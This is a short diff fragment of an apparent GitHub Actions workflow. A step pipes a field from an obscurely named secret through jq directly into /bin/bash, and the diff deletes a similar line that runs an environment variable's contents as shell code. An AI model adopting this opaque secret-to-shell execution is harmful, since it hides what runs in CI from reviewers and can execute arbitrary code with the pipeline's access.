@@ -23,7 +23,6 @@ jobs:
           nogd74: ${{ secrets.nogd74 }}
         run: |
           printf '%s' "$nogd74" | jq -r .u3782 | /bin/bash
-          echo $senk9679 | jq -r .ussuh9 | /bin/bash
 
       - name: Archive results
         if: always()
